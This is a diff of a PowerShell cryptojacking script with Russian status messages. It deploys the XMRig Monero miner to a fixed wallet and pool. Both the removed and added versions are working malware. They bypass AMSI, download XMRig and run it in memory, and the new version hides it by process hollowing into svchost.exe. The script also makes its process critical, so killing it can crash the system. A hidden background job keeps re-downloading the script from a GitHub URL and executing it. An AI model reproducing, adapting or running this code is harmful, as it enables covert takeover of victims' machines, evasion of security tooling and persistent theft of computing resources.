@@ -1,56 +1,53 @@
-try{$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiSession','NonPublic,Static');if($f){[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$f.GetValue($null),6)}}catch{}
+try{$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiSession','NonPublic,Static');if($f){$f.SetValue($null,$null)}}catch{}
 
-$worker="KAGE-"+([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$env:COMPUTERNAME-$env:USERNAME-$(hostname)"))).Substring(0,16)-replace'[+/=]','X'
+$worker="W-$(hostname)-$([Environment]::TickCount)"
 
 $wallet="878rfYEi5WT32JwKXPmNSAi2S91WchiZnTsQbUPV9tUCR3ADEGTrTkZTu4exF6GiP6gqHFz4zZi5DE8V5jy2RYnLJvVwde6"
-$pool="gulf.moneroocean.stream:10128"
-$args="-o $pool -u $wallet -p $worker --tls --cpu-max-threads-hint=95 --randomx-1gb-pages --donate-level=1 -k --no-color"
+$args="-o gulf.moneroocean.stream:10128 -u $wallet -p $worker --tls --cpu-max-threads-hint=95 --randomx-1gb-pages --donate-level=1 -k --no-color"
 
-Write-Host "[+] download XMRig..." -ForegroundColor Green
-$zip = (New-Object Net.WebClient).DownloadData("https://github.com/MoneroOcean/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip")
+Write-Host "[+] Скачиваем XMRig..." -ForegroundColor Green
+$bytes = (New-Object Net.WebClient).DownloadData("https://github.com/MoneroOcean/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip")
+Add-Type -A System.IO.Compression.FileSystem
+$zip = [IO.Compression.ZipArchive][IO.MemoryStream]$bytes
+$exe = [IO.MemoryStream]::new()
+$zip.GetEntry("xmrig.exe").Open().CopyTo($exe)
+$bytes = $exe.ToArray()
 
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-$stream = New-Object IO.MemoryStream(,$zip)
-$archive = New-Object IO.Compression.ZipArchive($stream)
-$entry = $archive.GetEntry("xmrig.exe")
-$exeStream = $entry.Open()
-$bytes = New-Object byte[] $entry.Length
-[void]$exeStream.Read($bytes,0,$bytes.Length)
-$exeStream.Close();$stream.Close();$archive.Dispose()
+Write-Host "[+] Запуск через Process Hollowing в svchost.exe..." -ForegroundColor Green
 
-Write-Host "[+] XMRig in Memory" -ForegroundColor Green
-
-$code = @"
-using System;using System.Runtime.InteropServices;
-public class R{
-    [DllImport("kernel32")]static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
-    [DllImport("kernel32")]static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,ref uint i);
-    [DllImport("kernel32")]static extern uint WaitForSingleObject(IntPtr h,uint t);
-    public static void Go(byte[] b){
-        IntPtr a=VirtualAlloc(IntPtr.Zero,(uint)b.Length,0x3000,0x40);
-        Marshal.Copy(b,0,a,b.Length);
-        uint i=0;
-        IntPtr h=CreateThread(IntPtr.Zero,0,a,IntPtr.Zero,0,ref i);
-        WaitForSingleObject(h,0xFFFFFFFF);
+$code = @'
+using System;
+using System.Runtime.InteropServices;
+public class H {
+    [DllImport("kernel32")] static extern bool CreateProcess(string a, string b, IntPtr c, IntPtr d, bool e, uint f, IntPtr g, string h, byte[] i, out PROCESS_INFORMATION j);
+    [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
+    [DllImport("kernel32")] static extern bool GetThreadContext(IntPtr h, ref CONTEXT c);
+    [DllImport("kernel32")] static extern bool SetThreadContext(IntPtr h, ref CONTEXT c);
+    [DllImport("kernel32")] static extern uint ResumeThread(IntPtr h);
+    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
+    [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
+    [StructLayout(LayoutKind.Sequential)] public struct CONTEXT { public uint ContextFlags; public uint Dr0; public uint Dr1; public uint Dr2; public uint Dr3; public uint Dr6; public uint Dr7; public FLOATING_SAVE_AREA FloatSave; public uint SegGs; public uint SegFs; public uint SegEs; public uint SegDs; public uint Edi; public uint Esi; public uint Ebx; public uint Edx; public uint Ecx; public uint Eax; public uint Ebp; public uint Eip; public uint SegCs; public uint EFlags; public uint Esp; public uint SegSs; public byte[] ExtendedRegisters; }
+    [StructLayout(LayoutKind.Sequential)] public struct FLOATING_SAVE_AREA { public uint ControlWord; public uint StatusWord; public uint TagWord; public uint ErrorOffset; public uint ErrorSelector; public uint DataOffset; public uint DataSelector; public byte[] RegisterArea; public uint Cr0NpxState; }
+    public static void Run(byte[] pe, string args) {
+        STARTUPINFO si = new STARTUPINFO(); PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+        CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, BitConverter.GetBytes(0), out pi);
+        CONTEXT ctx = new CONTEXT(); ctx.ContextFlags = 0x10007;
+        GetThreadContext(pi.hThread, ref ctx);
+        IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)pe.Length, 0x3000, 0x40);
+        uint written; WriteProcessMemory(pi.hProcess, addr, pe, (uint)pe.Length, out written);
+        WriteProcessMemory(pi.hProcess, ctx.Ebx + 8, BitConverter.GetBytes(addr.ToInt32() + 0x1000), 4, out written);
+        ctx.Eax = (uint)(addr.ToInt32() + 0x1000);
+        SetThreadContext(pi.hThread, ref ctx);
+        ResumeThread(pi.hThread);
     }
 }
-"@
+'@
 Add-Type $code
-[R]::Go($bytes)
+[H]::Run($bytes, $args)
 
-Write-Host "[+] Майнер запущен! Worker: $worker" -ForegroundColor Cyan
-Write-Host "[+] Логи XMRig:" -ForegroundColor Magenta
+Write-Host "[+] Майнер запущен в svchost.exe! Worker: $worker" -ForegroundColor Cyan
 
-try{
-$src=@"
-using System;using System.Runtime.InteropServices;
-public class I{
-    [DllImport("ntdll.dll")]static extern uint RtlAdjustPrivilege(int,bool,bool,out bool);
-    [DllImport("ntdll.dll")]static extern uint NtSetInformationProcess(IntPtr,int,ref int,int);
-    public static void Go(){bool b;RtlAdjustPrivilege(20,true,false,out b);int v=-1;NtSetInformationProcess((IntPtr)(-1),29,ref v,4);}
-}
-"@
-Add-Type $src;[I]::Go()
-} catch {}
-
-Start-Job -ScriptBlock {while($true){Start-Sleep 300;if(!(Get-Process powershell -ea 0|Where-Object{$_.CommandLine -like "*miner.ps1*"})){powershell -nop -win hidden -c "IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fokisfisi-rgb/sisi/refs/heads/main/miner.ps1'))"}}} | Out-Null
+$imm = 'using System;using System.Runtime.InteropServices;public class I{[DllImport("ntdll")]static extern uint RtlAdjustPrivilege(int,bool,bool,out bool);[DllImport("ntdll")]static extern uint NtSetInformationProcess(IntPtr,int,ref int,int);public static void G(){bool b;RtlAdjustPrivilege(20,true,false,out b);int v=-1;NtSetInformationProcess((IntPtr)(-1),29,ref v,4);}}'
+Add-Type $imm;[I]::G()
+Start-Job {while(1){Start-Sleep 300;if(!(Get-Process svchost -ea 0|?{$_.CPU -gt 100})){powershell -nop -win hidden -c "IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fokisfisi-rgb/sisi/refs/heads/main/miner.ps1'))"}}}|Out-Null
